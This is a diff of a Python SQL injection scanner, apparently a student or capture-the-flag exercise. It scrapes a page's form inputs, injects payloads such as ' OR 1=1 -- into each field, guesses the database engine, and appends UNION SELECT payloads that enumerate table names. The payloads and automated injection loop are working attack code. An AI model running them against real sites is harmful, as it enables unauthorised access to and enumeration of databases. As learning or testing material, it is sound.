@@ -1,6 +1,15 @@
 import requests
 import argparse
-from bs4 import BeautifulSoup, Comment
+from bs4 import BeautifulSoup
+
+injections = {
+            'mariadb': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --",
+            'mysql': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema = DATABASE() --",
+            'postgresql': "' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_catalog = current_database() --",
+            'oracle': "' UNION SELECT table_name, NULL FROM all_tables --",
+            'sqlite': "' UNION SELECT name, NULL FROM sqlite_master WHERE type='table' --",
+            'microsoft sql server': "' UNION SELECT table_name, NULL FROM information_schema.tables",
+        }
 
 class Vaccine:
     def __init__(self, url, method='GET', archive=None):
@@ -8,49 +17,62 @@ class Vaccine:
         self.method = method
         self.archive = archive or 'vulnerabilities.log'
         self.payloads = ["' OR 1=1 --", "'"]
-        self.payloads_pass = ["qwerty"]
         self.results = []
         self.database = None
+        self.database_tab = ["mysql", "mariadb", "postgresql", "oracle", "sqlite", "microsoft sql server", "mongodb"]
+        self.form = []
 
     def test_injection(self):
         before = requests.get(self.url)
-        for payload in self.payloads:
-            for password in self.payloads_pass:
+        self.form = self.scrap_form()
+        for input_test in self.form:
+            for payload in self.payloads:
+                data = {}
+                for input in self.form:
+                    if input != input_test:
+                        data[input] = "abc"
+                    else:
+                        data[input] = payload
+                print(data) #### value test ####
                 if self.method.upper() == 'GET':
-                    response = requests.get(self.url, params={'login': payload, 'password': password})
-                    if self.database == None:
-                        self.database = self.identify_sgbd(response)
+                    response = requests.get(self.url, params=data)
                 elif self.method.upper() == 'POST':
-                    response = requests.post(self.url, data={'login': payload, 'password': password})
-                    if self.database == None:
-                        self.database = self.identify_sgbd(response)
+                    response = requests.post(self.url, data=data)
+                if self.database == None:
+                    self.database = self.identify_sgbd(response)
+                    if self.database:
+                        self.payloads.append(injections[self.database])
                 if self.is_vulnerable(before, response) == True:
                     self.results.append((self.url, payload))
-                    self.log_result(self.url, payload)
-                print(self.database)
+                    self.log_result(self.url, payload, input_test)
 
     def is_vulnerable(self, before, response):
-        error_messages = ["you have an error in your SQL syntax;", "unclosed quotation mark after the character string", "syntax error", "warning", "welcome", "failed"]
+
+        error_messages = ["you have an error in your SQL syntax;", 
+                            "unclosed quotation mark after the character string",
+                            "syntax error", "warning", "welcome",
+                            "failed", "flag"]
         if before.text != response.text:
+            print(response.text)
             for error_message in error_messages:
                 if error_message in response.text.lower():
                     return True
         return False
 
-    def log_result(self, url, payload):
+    def log_result(self, url, payload, input_test):
         with open(self.archive, 'a') as file:
-            file.write(f'URL: {url}\nPayload: {payload}\n\n')
+            if self.database:
+                file.write(f'Database: {self.database}\n')
+            file.write(f'URL: {url}\nPayload: {payload}\nInput: {input_test}\n\n')
 
     def run(self):
         # print("SGDB: ", self.identify_sgbd())
         self.test_injection()
         if self.results:
-            print("Vulnerabilities found:")
-            # for result in self.results:
-                # print(f"URL: {result[0]} Payload: {result[1]}")
-            print(f"Database: {self.database}")
+            print("Vulnerabilities found")
         else:
-            print("No vulnerabilities found.")
+            print(self.database)
+            print("No vulnerabilities found")
 
     def identify_sgbd(self, after):
         response = requests.get(self.url)
@@ -58,61 +80,27 @@ class Vaccine:
         powered_by_header = response.headers.get('X-Powered-By', '').lower()
 
         # Analyze HTTP headers
-        if 'mysql' in server_header or 'mysql' in powered_by_header:
-            return "MySQL"
-        elif 'mariadb' in server_header or 'mariadb' in powered_by_header:
-            return "MariaDB"
-        elif 'postgresql' in server_header or 'postgresql' in powered_by_header:
-            return "PostgreSQL"
-        elif 'oracle' in server_header or 'oracle' in powered_by_header:
-            return "Oracle"
-        elif 'sqlite' in server_header or 'sqlite' in powered_by_header:
-            return "SQLite"
-        elif 'microsoft sql server' in server_header or 'microsoft sql server' in powered_by_header:
-            return "Microsoft SQL Server"
-        elif 'mongodb' in server_header or 'mongodb' in powered_by_header:
-            return "MongoDB"
+        for db in self.database_tab:
+            if db in server_header or db in powered_by_header:
+                return db
 
         # Analyze error messages
         error_response = after
         error_message = error_response.text.lower()
         # print(error_message)
-        if 'mysql' in error_message:
-            return "MySQL"
-        elif 'mariadb' in error_message:
-            return "MariaDB"
-        elif 'postgresql' in error_message or 'syntax error at or near' in error_message:
-            return "PostgreSQL"
-        elif 'oracle' in error_message:
-            return "Oracle"
-        elif 'sqlite' in error_message or 'no such table' in error_message:
-            return "SQLite"
-        elif 'microsoft sql server' in error_message:
-            return "Microsoft SQL Server"
-        elif 'mongodb' in error_message:
-            return "MongoDB"
-
-        # Analyze page source for database clues
-        soup = BeautifulSoup(response.text, 'html.parser')
-        comments = soup.findAll(string=lambda text: isinstance(text, Comment))
-        for comment in comments:
-            comment_lower = comment.lower()
-            if 'mysql' in comment_lower:
-                return "MySQL"
-            elif 'mariadb' in comment_lower:
-                return "MariaDB"
-            elif 'postgresql' in comment_lower:
-                return "PostgreSQL"
-            elif 'oracle' in comment_lower:
-                return "Oracle"
-            elif 'sqlite' in comment_lower:
-                return "SQLite"
-            elif 'microsoft sql server' in comment_lower:
-                return "Microsoft SQL Server"
-            elif 'mongodb' in comment_lower:
-                return "MongoDB"
+        for db in self.database_tab:
+            if db in error_message:
+                return db
 
         return None
+    
+    def scrap_form(self):
+        response = requests.get(self.url)
+        soup = BeautifulSoup(response.text, 'html.parser')
+        form = soup.find('form')
+        input_names = [input.get('name') for input in form.find_all('input') if input.get('name')]
+        return input_names
+
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="SQL Injection Detection Tool")
